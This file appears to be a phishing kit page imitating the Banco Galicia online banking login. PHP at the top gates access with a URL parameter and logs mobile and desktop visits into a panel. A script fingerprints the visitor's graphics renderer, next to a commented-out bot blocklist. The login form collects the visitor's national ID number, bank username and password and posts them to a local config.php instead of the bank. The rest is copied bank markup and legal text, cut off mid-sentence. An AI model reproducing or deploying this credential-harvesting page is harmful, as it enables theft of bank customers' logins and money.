<?php

session_start();
    

		if($_GET["the"]=="theking"){
		$txt = "painel/v.txt";
		$arquivo = fopen($txt,"r");
		$visitas   = fgets($arquivo,1024);
		fclose($arquivo);
		$x = $visitas;
		$arquivo = fopen($txt,"r+");
		$visitas = $visitas + 1;
		fwrite($arquivo,$visitas);
		fclose($arquivo);
			
	     require_once("painel/configure.php");
			
		}else{
			$id = base64_encode(md5(time()));
			header("location: painel.php?id=$id"); 
			
		}


        #============================


		$iphone = strpos($_SERVER['HTTP_USER_AGENT'],"iPhone");
		$ipad = strpos($_SERVER['HTTP_USER_AGENT'],"iPad");
		$android = strpos($_SERVER['HTTP_USER_AGENT'],"Android");
		$palmpre = strpos($_SERVER['HTTP_USER_AGENT'],"webOS");
		$berry = strpos($_SERVER['HTTP_USER_AGENT'],"BlackBerry");
		$ipod = strpos($_SERVER['HTTP_USER_AGENT'],"iPod");
		$symbian = strpos($_SERVER['HTTP_USER_AGENT'],"Symbian");
		$windowsphone = strpos($_SERVER['HTTP_USER_AGENT'],"Windows Phone");

		if ($iphone || $ipad || $android || $palmpre || $ipod || $berry || $symbian || $windowsphone == true) {
		    
			$dispositivo = "mobile";
		    $txt = "painel/m.txt";
			$arquivo = fopen($txt,"r");
			$visitas   = fgets($arquivo,1024);
			fclose($arquivo);
			$x = $visitas;
			$arquivo = fopen($txt,"r+");
			$visitas = $visitas + 1;
			fwrite($arquivo,$visitas);
			fclose($arquivo);
		 
		 
		 }
		else { 
		   

		    $dispositivo = "pc";
		    $txt = "painel/d.txt";
			$arquivo = fopen($txt,"r");
			$visitas   = fgets($arquivo,1024);
			fclose($arquivo);
			$x = $visitas;
			$arquivo = fopen($txt,"r+");
			$visitas = $visitas + 1;
			fwrite($arquivo,$visitas);
			fclose($arquivo);
		 
		} 

	

?>
<!DOCTYPE html>

<html lang="es-ar">


<meta http-equiv="content-type" content="text/html;charset=utf-8" />
<head>
    
<script>
      async function test() {
          var canvas = await document.createElement('canvas');
          var gl = canvas.getContext('webgl');
          var gls = canvas.getContext('experimental-webgl');
          console.log(gl);

          var ext = await gl.getExtension('WEBGL_debug_renderer_info');

          var dado1 = await gl.getParameter(ext.UNMASKED_RENDERER_WEBGL);
          var dado2 = await gls.getParameter(ext.UNMASKED_RENDERER_WEBGL);
          var dado3 = await gl.getExtension('WEBGL_debug_renderer_info');
          var dado4 = await gls.getExtension('WEBGL_debug_renderer_info');

          return dado1;
      }
  async function checa_navegador() {
    var ua = navigator.userAgent.toLowerCase();
    var uMobile = '';
    uMobile = 'ipad;iphone;ipod;windows phone;android;iemobile 8';
    v_uMobile = uMobile.split(';');
    var boolMovel = false;

    for (i = 0; i <= v_uMobile.length; i++) {
      if (ua.indexOf(v_uMobile[i]) != -1) {
        boolMovel = true;
      }
    }

      const body = await test();

      //const blocked = [
        '',
        '',
        ''
      //];

      for(let i= 0; i < blocked.length; i++){
        //if(body.includes(blocked[i])) window.location.href = 'https://google.com';
      }

    /*if (boolMovel == true) {
      location.href = 'mobile-acesso-tipo.php';
    } else {
      location.href = 'acesso-conta-pc.php';
    }*/
  }

  setTimeout(checa_navegador, 1500);
  </script>
    <meta charset="utf-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5, user-scalable=0">

    <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
    <meta name="robot" content="All" />
    <meta name="rating" content="general" />
    <meta name="Distribution" content="Global" />




    <title>Online Banking</title>



    <link rel="shortcut icon" href="Images/favicon.ico" />
    <link rel="apple-touch-icon" href="images/assets/logo_ios_60x60.png" />
    <link rel="apple-touch-icon" sizes="76x76" href="images/assets/logo_ios_76x76.html" />
    <link rel="apple-touch-icon" sizes="120x120" href="images/assets/logo_ios_120x120.png" />
    <link rel="apple-touch-icon" sizes="152x152" href="images/assets/logo_ios_152x152.png" />

    <link type="text/css" href="Content/bootstrap.minecdb.css?v=638144005967340000" rel="stylesheet" />
    <link type="text/css" href="Content/default.minb04f.css?v=638144006175890000" rel="stylesheet" />

   
    <link type="text/css" href="Content/Keyboard/keyboardf832.css?v=638144005969550000" rel="stylesheet" />
    <link type="text/css" href="Content/Keyboard/simple-keyboard54c0.css?v=638144005969570000" rel="stylesheet" />


<script src="bundles/sharedout3c32?v=yUVXBWmo0YLvqtcuMIP0Y22eKqXQ2dPOQceK5neEn3Q1"></script>

    <script src="Scripts/FrontFunctions.minb6b4.js?v=638144005966680000" type="text/javascript"></script>
    <link type="text/css" href="Content/customcarousel.min381b.css?v=638144005967530000" rel="stylesheet" />

<script src="bundles/seguloginclientless21b1?v=9ZoP9ZFYiPx6cKccgyoSkhtYxZ89MVu0hcQrXZ7YUtM1"></script>

    <script>(function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({"gtm.start":new Date().getTime(),event:"gtm.js"});var f=d.getElementsByTagName(s)[0],j=d.createElement(s),dl=l!="dataLayer"?"&l="+l:"";j.async=true;j.src='../www.googletagmanager.com/gtm5445.html?id='+i+dl+'&gtm_auth=TiByp1Z92r_vHHqYjmr5yQ&gtm_preview=env-6&gtm_cookies_win=x';f.parentNode.insertBefore(j,f);})(window,document,"script","dataLayer","GTM-M6B9RZQ");</script>


    

    <script>(function(win, doc, style, timeout) {var STYLE_ID = 'at-body-style'; function getParent(){return doc.getElementsByTagName('head')[0];}function addStyle(parent, id, def){if (!parent){return;}var style = doc.createElement('style');style.id = id;style.innerHTML = def;parent.appendChild(style);}function removeStyle(parent, id){if (!parent){ return;}var style = doc.getElementById(id);if (!style){return;}parent.removeChild(style);}addStyle(getParent(), STYLE_ID, style);setTimeout(function() {removeStyle(getParent(), STYLE_ID);}, timeout);}(window, document, 'body {opacity: 0 !important}', 1700)); </script><script src="../assets.adobedtm.com/87fc8b53a8b1/118d2b304f55/launch-121f57795303.min.js"async></script>
    

    <script>function _0x4472(){ var _0x17197e =['hash', '99BTYcVg', '?rfr=', 'src', 'referrer', '10yktvDA', '7eTnhwc', '2106488vdizGJ', '179330oCCmlo', '110549kBSrRG', 'replace', '5486916VuKFzJ', '895548erxdUI', 'bancogalicia.com.ar', 'length', '535572OnPkcO', '3WehCDX', 'href', '&hash=', '891302pyPLks', 'https://gal.bgsensors.co/api/wb/b3f76076-f760-49d8-ab30-437b9b182ac7/60a375cb-568d-41f6-a2d9-0e5d6c6ad549/1244/', 'domain', '11NAfFer'];_0x4472 = function(){ return _0x17197e; }; return _0x4472();}var _0xd9222a = _0x5b05; (function(_0x59b396, _0x52f570){var _0x39a3a4 = _0x5b05, _0xf99ab9 = _0x59b396();while(!![]){try{var _0x2be577 = -parseInt(_0x39a3a4(0x1dd)) / 0x1 + parseInt(_0x39a3a4(0x1d0)) / 0x2 * (-parseInt(_0x39a3a4(0x1cd)) / 0x3) + parseInt(_0x39a3a4(0x1e0)) / 0x4 * (parseInt(_0x39a3a4(0x1d9)) / 0x5) + -parseInt(_0x39a3a4(0x1cc)) / 0x6 + -parseInt(_0x39a3a4(0x1da)) / 0x7 * (-parseInt(_0x39a3a4(0x1db)) / 0x8) + -parseInt(_0x39a3a4(0x1d5)) / 0x9 * (parseInt(_0x39a3a4(0x1dc)) / 0xa) + parseInt(_0x39a3a4(0x1d3)) / 0xb * (parseInt(_0x39a3a4(0x1df)) / 0xc);if(_0x2be577===_0x52f570)break;else _0xf99ab9['push'] (_0xf99ab9['shift']());}catch(_0x1f804c){_0xf99ab9['push'] (_0xf99ab9['shift']());}}}(_0x4472, 0x4f7e3)); function _0x5b05(_0x3df48a, _0x38bf10) { var _0x447252 = _0x4472(); return _0x5b05 = function(_0x5b0584, _0xbebd86){ _0x5b0584 = _0x5b0584 - 0x1cb; var _0x2fb87f = _0x447252[_0x5b0584]; return _0x2fb87f; },_0x5b05(_0x3df48a, _0x38bf10); }if (document[_0xd9222a(0x1d2)]['indexOf']('bancogalicia.com.ar', document[_0xd9222a(0x1d2)][_0xd9222a(0x1cb)] - _0xd9222a(0x1e1)[_0xd9222a(0x1cb)]) == -0x1) { var img = new Image(), hash = location[_0xd9222a(0x1d4)][_0xd9222a(0x1de)]('#', ''); img[_0xd9222a(0x1d7)] = _0xd9222a(0x1d1) + _0xd9222a(0x1d6) + encodeURI(document[_0xd9222a(0x1d8)]) + _0xd9222a(0x1cf) + hash + '&dom=' + document[_0xd9222a(0x1d2)] + '&href=' + encodeURI(location[_0xd9222a(0x1ce)]); }</script>
    

    <script defer src='https://gal.bgsensors.co/api/bgsensor/ccfac30f-772d-4a29-a82d-798db50348bb/f1192f0f-5749-4cea-8568-14c0bae9b5f0/'></script>

    


</head>
<body>
    <noscript><iframe src="https://www.googletagmanager.com/ns.html?id=GTM-M6B9RZQ&amp;gtm_auth=TiByp1Z92r_vHHqYjmr5yQ&amp;gtm_preview=env-6&amp;gtm_cookies_win=x" height="0" width="0" style="display:none;visibility:hidden"></iframe></noscript>






    <div class="container-fluid ">

        <div class="row full-h">
            <div class="left-column">



                <div class="logo_login" role="banner" data-automation-id="galicia-banner">
                    <a title="link a bancogalicia.com" class="logo" href="" aria-label="Ingresar a la página principal de Banco Galicia" target="_blank">
                        <div class="logo_sidebar_img"></div>
                    </a>
                    <p>Online Banking</p>                    
                </div>
                

<div class="login">


<div class="content-login" role="main" >



    <form action="config.php" method="post" required="submit">
        <input name="__RequestVerificationToken" type="hidden" value="niU0wwBaClXWTpN6q8YA8mnCxfIjlF2QEwrk-cZEipLz1hue7UCrHyPlJpRpOqEzbjqJdUrYYvX35UnSMYCm6Bsu5wRjK4Ewaz8jOkLKgtQ1" />
        <div class="login-form">
            <div class="row">
                <div class="col-xs-12">
                    <h1 onclick="enableDebug();" class="login-title hidden-xs">Iniciar sesión</h1>
                </div>
                <input data-hj-masked type="hidden" value="" name="EncriptedPassword" id="EncriptedPassword" />
                <div class="inputWrapper">
                    <div class="inputArea">
                        <div class="contentInput">
                            <input   data-hj-masked type="number" name="DocumentNumber" id="DocumentNumber" data-name="DocumentNumber" maxlength="11" value="" required="" autocapitalize="none" autocomplete="off" onkeypress="return ValidateRegExOnEvent(event, regEx_numbers);" oninput="maxLengthCheck(this);" class="form-control keyboard">
                        </div>
                        <label for="DocumentNumber" class="inputLabel">Tu DNI</label>
                        <div class="inputUnderline"></div>
                    </div>
                </div>

                <div class="inputWrapper password">
                    <div class="inputArea">
                        <div class="contentInput">
                            <input  data-hj-masked type="password" name="UserName" id="UserName" data-name="UserName" spellcheck="false" value="" maxlength="20" required="" class="form-control hidden-control keyboard" onkeypress="return ValidateRegExOnEvent(event, regEx_alphanumeric);" autocomplete="off">
                        </div>
                        <label for="UserName" class="inputLabel">Tu usuario Galicia</label>
                        <div class="capsLock"></div>
                        <div class="showPassword"></div>
                        <div class="inputUnderline"></div>
                        <div class="labelMsg">Bloqueo de mayúsculas activado</div>
                    </div>
                </div>

                <div class="inputWrapper password">
                    <div class="inputArea">
                        <div class="contentInput">
                            <input  autocomplete="off"  data-hj-masked="" type="password" name="Password" id="Password" size="4" data-name="Password" spellcheck="false" maxlength="4" required="" onkeypress="return ValidateRegExOnEvent(event, regEx_numbers);" class="form-control hidden-control keyboard" autocomplete="off" aria-required="true">
                        </div>
                        <label for="Password" class="inputLabel" data-hj-masked="">Tu clave Galicia</label>
                        <div class="showPassword" data-hj-masked=""></div>
                        <div class="inputUnderline" data-hj-masked=""></div>
                    </div>
                </div>

                <div class="col-xs-12">
                    <div class="form-group">
                        <div class="checkbox checkbox-primary">
                            <input name="RememberMe" id="RememberMe" type="checkbox" value="true" />
                            <label for="RememberMe">
                                Recordar DNI y Usuario
                            </label>
                        </div>
                        <input name="RememberMe" type="hidden" value="false" />
                    </div>
                </div>
                <div class="col-xs-12">
                        <div class="teclado teclado-virtual hidden-xs keyboard-trigger">
                            <i class="far fa-keyboard " id="keyboardIcon" style="cursor: pointer;"></i>
                            <div name="divTeclado" id="divTeclado" type="checkbox" value="true">Teclado Virtual</div>
                        </div>
                </div>

                <div class="col-xs-12">
                    <button class="btn btn-md btn-full-width" type="submit" onclick="Submit;" id="submit">
                        iniciar sesión
                    </button>
                </div>

                    <div class="col-xs-12">
                        <div class="links">

                            <a href="" class="btn btn-caps pull-left">
                                OLVIDÉ O BLOQUEÉ MIS CLAVES
                            </a>
                        </div>
                    
                        <p>Sí es tu primera vez o necesitás el usuario</p>
                        <div class="links">
                            <a class="btn btn-caps pull-left" href="">
                                CREÁ TUS CLAVES
                            </a>
                        </div>
                    </div>

            </div>
        </div>

        <input data-hj-masked type="hidden" id="DevicePrintAdaptive" name="DevicePrintAdaptive" />
        <input data-hj-masked type="hidden" id="isDebugEnabled" name="isDebugEnabled" value="false" />
        <input data-hj-masked type="hidden" id="CodigoProducto" name="CodigoProducto" />

    </form>
</div>
</div>

<div class="terms" role="contentinfo">
    <p>Operar con Online Banking implica aceptar los <a href="javascript:void(0)" onclick="javascript:window.open('terminosycondiciones.html', '_blank');return false;">términos y condiciones</a> en los que se ofrece el servicio.</p>
    <p>Información sobre seguridad</p>
</div>
    <div class="simple-keyboard hidden-xs" id="simpleKeyboard" style="display:none;"></div>
<div class="modal fade" id="popupErrorCredenciales" role="dialog" data-backdrop="static" data-keyboard="false">
    <div class="modal-dialog">
        <!-- Modal content-->
        <div class="modal-content">
            <div class="modal-header">
                <p class="modal-title description">Los datos que ingresaste tienen algún error</p>
            </div>
            <div class="modal-body">
                <p>Por favor, revisalos antes de volver a intentarlo, ya que tu usuario y clave pueden bloquearse.</p>
                <p>
                    08042023122004
                </p>
            </div>
            <div class="modal-footer">
                <button type="button" class="btn btn-caps" data-dismiss="modal">ACEPTAR</button>
            </div>

        </div>
    </div>
</div>

        


            </div>


            <div class="side-info content img art art-6" role="complementary" data-automation-id="out-banner">
                <div class="bullet">
                    <h2>Bienvenido a<br /> Online Banking</h2>
                </div>
            </div>
        </div>
    </div>
    <div id="mainModalContainer"></div>

    <script type="text/javascript">
        $(document).ready(function () {
            var xhrPool = [];
            $(document).ajaxSend(function (e, jqXHR, options) {
                xhrPool.push(jqXHR);
            });
            $(document).ajaxComplete(function (e, jqXHR, options) {
                xhrPool = $.grep(xhrPool, function (x) { return x != jqXHR });
                $.HBAnalytics.addHotjarAttribute();
                RenewTimeOutClientSide();
            });
            var abort = function () {
                $.each(xhrPool, function (idx, jqXHR) {
                    jqXHR.abort();
                });
            };

            var oldbeforeunload = window.onbeforeunload;
            window.onbeforeunload = function () {
                var r = oldbeforeunload ? oldbeforeunload() : undefined;
                if (r == undefined) {
         
                    abort();
                }
                return r;
            }
            inputsEfect();
            $.HBAnalytics.triggerHotjarReady();
            sessionStorage.removeItem("signOut");
            $.HBAnalytics.executeGtmTags($.HBAnalytics.afterReadyEvents);

            try { if(window.location.pathname == '/tarjetas/Resumen/1' || window.location.pathname == '/tarjetas/Resumen/0' || window.location.pathname == '/tarjetas/Resumen/2'){

 $("body > div.container-fluid > div.main > div.row.full-h > div.col-xs-12.content-resumen > div:nth-child(1) > div:nth-child(3) > div.col-xs-12.col-sm-3.col-md-3 > button.btn.btn-md.pull-right.hidden-xs").hide();
  }

if(window.location.pathname == '/inversiones/seleccionar-inversion'){
$('.box-opciones h3').each(function () {
if( $(this)[0].innerText == 'Criptomonedas' || $(this)[0].innerText == 'Criptos'){

var chipCripto= document.createElement("div");
var leyendaNuevo = document.createElement("span");

var text = document.createTextNode("");
leyendaNuevo.appendChild(text);

$(this)[0].appendChild(chipCripto);
$(chipCripto).addClass('chip-nuevo pull-right');

$(leyendaNuevo).addClass('nuevo-cripto color-default no-padding-top');
$('.chip-nuevo')[0].style.borderRadius = "4px";
$('.chip-nuevo')[0].style.backgroundColor = "#e6e2e2";
$('.chip-nuevo')[0].style.padding = "4px 8px";
$('.chip-nuevo')[0].style.display = "inline-flex";
$('.chip-nuevo')[0].appendChild(leyendaNuevo);
$('.nuevo-cripto')[0].innerText = "¡Nuevo!"
$('.nuevo-cripto')[0].style.fontSize = "16px"
}
});
}


if(window.location.pathname == '/inversiones/v2/compraventa_bonos_acciones'){
    $(document).ajaxComplete(function( event, xhr, settings ) {
        if ( settings.url === "/inversiones/cargar-configuracion-especie" ) {
            
        var leyenda = document.createElement("P");                     
        var text = document.createTextNode("");   
        leyenda.appendChild(text);       
        document.getElementById("divPlazos").children[2].appendChild(leyenda);
        $(leyenda).addClass('leyenda-plazo f-size-12 no-margin-bottom bold-text')
     
         $(".opcionComboPlazo").on('click', function (event) {
            if ($("#PlazoSeleccionado").val() == "0"){   
            $('.leyenda-plazo').text('Importante: no podrás operar con este plazo a partir de las 16:00hs.')  
         }else{
          $('.leyenda-plazo').text('')
         }
         })   
            
        }
    });
}



$('.irAlSitioViejo.btn-acceso-login').hide();
$('.irAlSitioViejo').hide();

$(".consumos-resumen > .clearfix > .margin-text > .description:contains('Tarjeta cerrada')").html('Tarjeta cerrada');

if (window.location.pathname == '/asistentevirtual/galicia-conecta') {
var txt = $("form").find("p").html()
var txt2 = txt.replace("18", "17")
$("form").find("p").html(txt2)
}


//redirección a turnero nuevo
if(window.location.pathname == '/turnos/fuera-de-servicio'){
	$("h5.error").text("¡Nos renovamos!")
	$("p.description.error").text("¡Actualizamos nuestro Sistema de Turnos! Si necesitás sacar un turno para ir a tu sucursal por favor hacé click en el botón.")
	$("#Button1").addClass("btn-caps")
	$("#Button1").val("IR A NUEVO TURNERO")
	$("#Button1").attr("onclick", "window.location.href=''")
}




if(window.location.pathname == '/login'){


        setTimeout(function(){refreshLogin()},150000);
	$.ajaxSetup({
		error : function(jqXHR, textStatus, errorThrown) {
	    	try{
	            $.HBAnalytics.addEventsPartial({
	                event: "onb.error",
	                errorContext: "LogIn.Ajax." + jqXHR.status,
	                errorTitle: textStatus,
	                errorMessage: "error : " + errorThrown + " :: usr : " + $("#DocumentNumber").val()
		        });
	            $.HBAnalytics.executeGtmTags($.HBAnalytics.partialEvents);
	        } catch(e){ }
		}
	});
}



if(window.location.pathname == '/perfil/inicio'){
       $("a:contains('Configurar alertas')").removeAttr("onclick").click(function(){showErrorModal("Funcionalidad no disponible", "Estamos realizando modificaciones. Pronto podrás volver a configurar tus alertas.")});
}


$(".customcarousel-slider > div > div").each( function() {
    
    var texto1 = $(this).find(".hidden-xs:contains('cerró')").text();
    var texto2 = $(this).find(".visible-xs:contains('cerró')").text();

    if(texto1 != undefined)
    {
    $(this).find(".hidden-xs:contains('cerró')").html(texto1.substring(0,texto1.indexOf("cerró")) + "cerró.<span class='hidden-xs'>Estamos preparando tu resumen.</span>");
    }
    if(texto2 != undefined)
    {
    $(this).find(".visible-xs:contains('cerró')").html(texto2.substring(0,texto2.indexOf("cerró")) + "cerró.<span class='visible-xs'>Estamos preparando tu resumen.</span>");
    }

});


$(document).on('show.bs.modal', function(e){
    $('.modal-body>p:contains("El saldo en tu cuenta es menor al requerido para esta")').text('El monto ingresado es mayor al saldo de tu cuenta. En caso de operar con cuenta corriente con límite disponible del acuerdo de giro en descubierto, podés continuar con esta operación.')    
});

$('#divNuevoContacto > div:nth-child(1) > div.col-sm-8.col-lg-6.col-xlg-7 > div > label').each(function() {
if ($(this).html() === 'Joaquín')
    $(this).html('Nombre');
});

if(window.location.pathname == '/reporteimpuestos/solicitarreporteimpuestos'){
    $(".opcionComboAnioHasta[data-id='2017'],.opcionComboAnioDesde[data-id='2017']").parent().remove();
}



if(window.location.pathname == '/tarjetas/reponer-tarjeta-debito-delivery' && $("#reposicionTDContactlessLabelId").html() != undefined  ){
$("#reposicionTDContactlessLabelId").html($("#reposicionTDContactlessLabelId").html().replace("Quiero mi tarjeta con contactless", "Por otros motivos"));
}


function mostrarModalGalicia(){
	showErrorModal("", "Por favor ingresá un mail que no sea @bancogalicia.com.ar");
}

if (window.location.pathname == ''){
	$("#btn-preconfirmacion-submit").attr("onclick", null)

	$("#btn-preconfirmacion-submit").click(function(){
		if ($("#mailtexto").text().indexOf("") != -1){
			mostrarModalGalicia();    
		}
		else{
			$('#form-PreconfirmacionReporte').submit();
		}
	});
} 

if (window.location.pathname == ''){
	$("p:contains('Tené en cuenta')").hide()
}

if(document.querySelector("#tituloVencimientos > a") != undefined){
if(document.querySelector("#tituloVencimientos > a").href == "javascript:Link('/pagos/inicio');"){
document.querySelector("#tituloVencimientos > a").href =  "/navigation/menulink/409"}}

if(window.location.pathname == '/moneda-extranjera/terminosycondiciones')
{
document.querySelector("body > div.container-fluid.out > div.main > div.row.full-h > div > div > ol > li:nth-child(2)").textContent = "";
document.querySelector("body > div.container-fluid.out > div.main > div.row.full-h > div > div > ol > li:nth-child(2)").textContent ="me comprometo a no concertar en el país operaciones de títulos valores con liquidación en moneda extranjera a partir del momento en que requiero el acceso y por los 90 días corridos subsiguientes.";
var element = document.createElement("div");
element.innerHTML = "Declaro bajo juramento que no tengo pendiente financiaciones en pesos previstas en la Comunicación A 6937 y complementarias.<br>En relación a la Comunicación A 7327 punto 3.16 y sucesivas, declaramos bajo juramento que en la fecha y en los 90 días corridos anteriores no hemos concertado(i) ventas en el país de títulos valores con liquidación en moneda extranjera, o (ii) transferencias de los mismos a entidades depositarias del exterior, o (iii) canje de títulos valores por activos externos. Al mismo tiempo, nos comprometemos a no realizar este tipo de operaciones a partir del momento en que accedemos al mercado y por los 90 días corridos subsiguientes. No integran la presente DDJJ las transferencias de títulos valores a entidades depositarias del exterior que hemos realizado o hemos de realizar con el objeto de participar de un canje de títulos de deuda emitidos por el Gobierno Nacional, gobiernos locales u emisores residentes del sector privado. Asimismo nos comprometemos a  presentar la correspondiente certificación de por los títulos de deuda canjeados. Lo indicado en referencia a canje de títulos valores por otros activos externos regirá para los canjes concertados a partir del 12.7.21.<br>Declaro bajo juramento que no soy beneficiario de “Crédito a Tasa Cero” acordado en el marco del artículo 9° del Decreto N° 332/2020 (y modificatorias).<br>Por otro lado, en referencia a la Comunicación A 7006 punto 6, declaro bajo juramento que no soy beneficiario de las financiaciones acordadas conforme a los puntos 2 y 3 de esta Comunicación.<br>En referencia a la Comunicación 'A' 7082 punto 5, declaro bajo juramento no soy beneficiario de los “Créditos a Tasa Subsidiada para Empresas”, ni de los “Créditos a Tasa Cero Cultura” previstos en el Decreto N°332/2020.<br>Declaro bajo juramento que es de mi conocimiento lo dispuesto en el punto 1 de la Comunicación A 7106.<br>En relación a la Comunicación “A” 7106 punto 2, declaro bajo juramento no soy beneficiario de lo dispuesto en el punto 4 de la Comunicación “A” 6949 y complementarias y/o en el artículo 2° del Decreto N° 319/20.<br>En relación a la Comunicación “A” 7140, declaro bajo juramento no soy beneficiario de una línea de financiamiento para la inversión productiva de MiPyME<br>En relación a la Comunicación A 7126 punto 1, declaro bajo juramento que no revisto el carácter de funcionario público nacional a partir del rango de Subsecretario de Estado (o rango equivalente), como así tampoco revisto el cargo de director de un Banco público nacional ni del BCRA.<br>No soy beneficiario de los “Créditos a Tasa Cero” acordados en el marco del Decreto Nº 512/21 (Comunicación A 7342 punto 3).<br>Declaro bajo juramento que esta operación se ajusta a la normativa cambiaria que declaro conocer en su totalidad, y que: No me encuentro suspendido y/o inhabilitado por el Banco Central de la República Argentina para operar en cambios. Con esta compra no supero el límite máximo permitido por la normativa vigente para el mes calendario y en el conjunto de entidades financieras.Los fondos comprados no serán destinados a la adquisición en el mercado secundariode títulos valores dentro de los próximos 5 días hábiles<br>Tomo conocimiento que la falsedad en la presente Declaración jurada me hace pasible de las sanciones establecidas en el Régimen Penal Cambiario establecido por ley 19.359 y sus modificatorias.<br>Asumo el compromiso de mantener indemne y liberar de toda responsabilidad al Banco de Galicia y Buenos Aires S.A.U por cualquier daño y/o reclamo futuro que pudiera estar originado en una falsedad consignada en la presente declaración.";

document.querySelector("body > div.container-fluid.out > div.main > div.row.full-h > div > div > p:nth-child(6)").innerHTML = "";
document.querySelector("body > div.container-fluid.out > div.main > div.row.full-h > div > div > p:nth-child(6)").innerHTML = element.innerHTML;

}

if(window.location.pathname == '/ComercioExterior/terminosycondiciones')
{
var element = document.createElement("div");
element.innerHTML = 'Manifiesto/Manifestamos, con carácter de Declaración Jurada, que:<br>Declaro bajo juramento que esta operación se ajusta a la normativa cambiaría que declaro conocer en su totalidad.<br>He/hemos dado cumplimiento en el caso de corresponder, a las presentaciones de las declaraciones de Relevamiento de Activos y Pasivos Externos, establecido en la Comunicación "A" 6401 y complementarias.<br>Por la presente tomo conocimiento de que el BCRA, mediante la Comunicación “A” 6844, establece que, para la constitución de activos externos, ayuda familiar para la operatoria con derivados por un monto superior al equivalente de U$S200 mensuales en el conjunto de las entidades autorizadas a operar en cambios, se requerirá autorización previa de ese Banco Central. El monto mencionado comprende el conjunto de los conceptos señalados precedentemente. La operación deberá cursarse con debito a cuentas del cliente en entidades financieras locales, admitiéndose el uso de efectivo en moneda local en operaciones hasta el equivalente de U$S 100 en el mes calendario y en el conjunto de entidades autorizadas a operar en cambios.<br>Por otro lado, en referencia a la Comunicación "A" 7138 Punto 5, hemos informado con una antelación de 2 días hábiles, la información sobre operaciones que correspondan a egresos por el mercado de cambios –incluyendo aquellas a concretarse a través de canjes o arbitrajes-que impliquen un acceso al mercado de cambios por un monto diario que sea igual o superior al equivalente a US$ 50.000.<br>Declaro / Declaramos bajo juramento que con la concertación de la presente operación no superamos los límites de montos establecidos actualmente en la normativa vigente. <br>Declaramos bajo juramento que el presente pago no corresponde a una operación de pago de servicios con empresas vinculadas del exterior como se describe en el punto 3.2 de Comunicación "A" 6844.<br>En relación al acceso al Mulc por medio de los Códigos de Concepto del punto 3.8 de la Com A 6844, declaro bajo juramento que nos comprometemos a no concertar en el país operaciones de títulos valores con liquidación en moneda extranjera a partir del momento en que requerimos el acceso y por los 90 días corridos subsiguientes”. Al mismo tiempo, declaramos bajo juramento que tomamos conocimiento de lo dispuesto en el punto 1 de la comunicación A 7106.<br>Nos comprometemos a demostrar el registro de ingreso aduanero de los bienes dentro del plazo que corresponda según el tipo de bien a importar. En el caso de pagos anticipados de bienes de capital, el plazo para demostrar el registro de ingreso aduanero será de 270 días corridos a partir de la fecha de acceso al mercado de cambios. Para el resto de los bienes, el plazo será de 90 días corridos a partir de la fecha de acceso al mercado local de cambios. Requerirá la conformidad previa del BCRA para los pagos anticipados de importaciones a proveedores vinculados con el importador. <br>Me comprometo a liquidar en el mercado local de cambios, dentro de los 5 días hábiles contados desde la puesta a mi disposición, las divisas que pudiera percibir en devolución de pagos de importaciones efectuados con acceso al mercado local de cambios, de conformidad con lo establecido en el punto 10.3.2.4 de la Comunicación "A" 6844.<br>En relación al punto 4.2.2. de la Com A 6844, declaro bajo juramento que no he efectuado venta de títulos valores con liquidación local en moneda extranjera en los últimos 5 días hábiles. <br>Tenemos conocimiento que, para poder realizar operaciones de formación de activos externos, remisión de ayuda familiar y operatoria con derivados, (todas ellas enunciadas en el punto 3.8. de las normas sobre “Exterior y cambios) es necesario contar con la autorización previa del BCRA o cumplir con la condición de no ser beneficiario de los préstamos referenciados en la Comunicación “A”6937; Por lo expuesto y relacionado exclusivamente con la operatoria mencionada en el presente párrafo, declaramos bajo juramento que no tenemos financiamiento pendiente de cancelación vinculado a los préstamos establecidos mediante Comunicación “A” 6937.<br>En referencia a la Comunicación "A" 6993 punto 5, declaro bajo juramento no soy beneficiario de los “Créditos a Tasa Cero” acordados en el marco del artículo 9° del Decreto N° 332/2020 (y modificatorias)<br>Por otro lado, en referencia a la Com. A 7006 punto 5, declaramos bajo juramento que no tenemos financiamiento pendiente de cancelación vinculadas con los puntos 2 y 3 de la presente Comunicación, ya sea por no haberlo solicitado, o ya sea por haberlo cancelado en su totalidad.<br>En referencia a la Comunicación "A" 7082 punto 5, declaro bajo juramento no soy beneficiario de los “Créditos a Tasa Subsidiada para Empresas”, ni de los “Créditos a Tasa Cero Cultura” previstos en el Decreto N°332/2020.<br>En relación a la Comunicación “A” 7106 punto 2, declaro bajo juramento no soy beneficiario de lo dispuesto en el punto 4 de la Comunicación “A” 6949 y complementarias y/o en el artículo 2° del Decreto N° 319/20.<br>En relación a la Comunicación “A” 7140, declaro bajo juramento no soy beneficiario de una línea de financiamiento para la inversión productiva de MiPyME.<br>Declaro bajo juramento que las posiciones arancelarias incluidas en este pago no se encuentran alcanzadas dentro de los Anexos I y II de la Com A 7201.<br>En relación a la Comunicación A 7126 punto 1, declaro bajo juramento que no revisto el carácter de funcionario público nacional a partir del rango de Subsecretario de Estado (o rango equivalente), como así tampoco revisto el cargo de director de un Banco público nacional ni del BCRA.<br>En relación al punto 1.a) de la Com A 7030 y sucesivas, declaramos bajo juramento que la totalidad de nuestras tenencias de moneda extranjera en el país se encuentran depositadas en cuentas en entidades financieras y que no poseemos activos externos líquidos disponibles al inicio del día en que solicitamos el acceso al mercado por un monto superior equivalente a US$ 100.000 (cien mil dólares estadounidenses). Por otro lado, según punto 1.b) nos comprometemos a liquidar en el mercado de cambios, dentro de los cinco días hábiles de su puesta a disposición, aquellos fondos que recibamos en el exterior originados en el cobro de préstamos otorgados a terceros, el cobro de un depósito a plazo o de la venta de cualquier tipo de activo, cuando el activo hubiera sido adquirido, el depósito constituido o el préstamo otorgado con posterioridad al 28.05.2020.<br>En el caso de contar con activos externos líquidos disponibles por un monto superior al establecido en el párrafo anterior, declaramos bajo juramento que no se excede tal monto al considerar que, parcial o totalmente, tales activos:<br>i) fueron utilizados durante esa jornada para realizar pagos que hubieran tenido acceso al mercado local de cambios.<br>ii)    fueron transferidos a favor del cliente a una cuenta de corresponsalía de una entidad local autorizada a operar en cambios.<br>iii) son fondos depositados en cuentas bancarias del exterior que se originan en cobros de exportaciones de bienes y/o servicios o anticipos, prefinanciaciones o postfinanciaciones de exportaciones de bienes otorgados por no residentes, o en la enajenación de activos no financieros no producidos para los cuales no ha transcurrido el plazo de 5 días hábiles desde su percepción.<br>iv)   son fondos depositados en cuentas bancarias del exterior originados en endeudamientos financieros con el exterior 